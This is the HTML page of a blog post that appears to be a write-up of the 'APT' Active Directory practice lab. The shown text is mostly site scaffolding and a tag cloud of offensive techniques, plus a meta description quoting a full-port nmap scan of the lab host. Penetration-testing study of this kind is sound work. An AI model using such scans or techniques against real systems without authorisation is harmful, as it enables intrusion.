<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>Tracks-AD-APT | ❀言わぬが花❀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="Nmap12345└─$ sudo nmap -sS 10.10.10.213 -p- --min-rate&#x3D;3000PORT    STATE SERVICE80&#x2F;tcp  open  http135&#x2F;tcp open  msrpc    User80&#x2F;http80 web，内容如下  整个web没有存在价值的东西，support页面的contact部分在提交请求时会跳转到 10.13">
<meta property="og:type" content="article">
<meta property="og:title" content="Tracks-AD-APT">
<meta property="og:url" content="http://example.com/2025/06/04/Tracks-AD-APT/index.html">
<meta property="og:site_name" content="❀言わぬが花❀">
<meta property="og:description" content="Nmap12345└─$ sudo nmap -sS 10.10.10.213 -p- --min-rate&#x3D;3000PORT    STATE SERVICE80&#x2F;tcp  open  http135&#x2F;tcp open  msrpc    User80&#x2F;http80 web，内容如下  整个web没有存在价值的东西，support页面的contact部分在提交请求时会跳转到 10.13">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2025/tracks-ad/APT/background.jpg">
<meta property="article:published_time" content="2025-06-04T02:52:08.000Z">
<meta property="article:modified_time" content="2025-06-05T17:44:28.641Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="rpc">
<meta property="article:tag" content="ipv6">
<meta property="article:tag" content="pth">
<meta property="article:tag" content="reg">
<meta property="article:tag" content="Rogue potato">
<meta property="article:tag" content="Ntlmv1">
<meta property="article:tag" content="AD">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2025/tracks-ad/APT/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<script>



</script>
<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>❀言わぬが花❀ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/2FA/" rel="tag">2FA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Command-injection/" rel="tag">Command injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Configuration/" rel="tag">Configuration</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Dacl/" rel="tag">Dacl</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GPO/" rel="tag">GPO</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GSSAPI/" rel="tag">GSSAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Gbbion/" rel="tag">Gbbion</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HKLM/" rel="tag">HKLM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/IDOR/" rel="tag">IDOR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFR/" rel="tag">LFR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nodeport/" rel="tag">Nodeport</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Ntlmv1/" rel="tag">Ntlmv1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/OU/" rel="tag">OU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PetitPotam/" rel="tag">PetitPotam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pseudorandom/" rel="tag">Pseudorandom</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pyside2/" rel="tag">Pyside2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RECYCLE-BIN/" rel="tag">RECYCLE.BIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rogue-potato/" rel="tag">Rogue potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube-Webmail/" rel="tag">Roundcube Webmail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Self/" rel="tag">Self</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SharPy/" rel="tag">SharPy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tombstone/" rel="tag">Tombstone</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteGPlink/" rel="tag">WriteGPlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bbot/" rel="tag">bbot</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bloodhound/" rel="tag">bloodhound</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bookstack/" rel="tag">bookstack</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-AMSI/" rel="tag">bypass AMSI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/crtp/" rel="tag">crtp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnschef/" rel="tag">dnschef</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc14/" rel="tag">esc14</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc15/" rel="tag">esc15</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/exam/" rel="tag">exam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fifo/" rel="tag">fifo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/git/" rel="tag">git</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gpo/" rel="tag">gpo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ipv6/" rel="tag">ipv6</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ispconfig/" rel="tag">ispconfig</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jar/" rel="tag">jar</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/krbrelayx/" rel="tag">krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kube-proxy/" rel="tag">kube-proxy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/lsaquery/" rel="tag">lsaquery</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mysqljs/" rel="tag">mysqljs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/neo4j/" rel="tag">neo4j</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/note/" rel="tag">note</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ntlmrelayx/" rel="tag">ntlmrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/owa/" rel="tag">owa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pdf/" rel="tag">pdf</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pinns/" rel="tag">pinns</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgresql/" rel="tag">postgresql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powershell/" rel="tag">powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/powerview/" rel="tag">powerview</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pre2k/" rel="tag">pre2k</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/psexec/" rel="tag">psexec</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pswa/" rel="tag">pswa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pth/" rel="tag">pth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pyjail/" rel="tag">pyjail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reg/" rel="tag">reg</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rootkit/" rel="tag">rootkit</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpc/" rel="tag">rpc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/rpcclient/" rel="tag">rpcclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/runascs/" rel="tag">runascs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/s3/" rel="tag">s3</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sercerts/" rel="tag">sercerts</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/service/" rel="tag">service</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sherlocks/" rel="tag">sherlocks</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/shm/" rel="tag">shm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/sliver-ticketer/" rel="tag">sliver ticketer</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb/" rel="tag">smb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smb-krbrelayx/" rel="tag">smb_krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/smbmap/" 